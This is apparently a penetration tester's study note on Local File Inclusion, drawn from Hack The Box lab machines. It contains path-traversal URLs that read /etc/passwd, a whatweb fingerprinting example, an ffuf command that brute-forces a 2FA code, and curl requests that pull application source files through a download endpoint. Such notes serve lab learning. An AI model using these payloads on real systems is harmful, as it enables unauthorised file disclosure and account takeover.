---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[LFI]]  
___

## Description:  
### Local File Inclusion

`http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd

if that doesn't work try

`http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html

### whatweb can identify web severs and get common directories
https://github.com/urbanadventurer/WhatWeb
```

./whatweb http://only4you.htb/

Lightbox, Script, Title[Only4you], nginx[1.18.0]
```

### Common webserver directories

- `C:\inetpub\wwwroot`
- `/var/www/ (before Ubuntu 14.04)` 
- `/var/www/html/ (Ubuntu 14.04 and later)`
- ``/usr/share/nginx/html (nginx)`` 
- ``/usr/share/nginx``

### Fuff Automation

Once an lfi is discovered, fluff can be used for automation. Look for different extensions in the web root directory like .py, .php, etc.
```
ffuf -w number.txt -X POST -d "password=FUZZ" -b "TCSESSIONID=74BCFD74A212BEC7DF8533FAD3E6FA50" -request ../request.txt -u https://teamcity-dev.coder.htb/2fa.html -fr "Incorrect" -c
```

You can also use gobuster with the -x flag to enumerate different file extensions.

### Look for import statements in source code

```
root@kali:~# curl -X POST http://beta.only4you.htb/download -d "image=/var/www/only4you.htb/app.py"
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid
```

"from form import sendmessage" means there is a file called form.py
```
root@kali:~# curl -X POST http://beta.only4you.htb/download -d  image=/var/www/only4you.htb/form.py
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:32 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
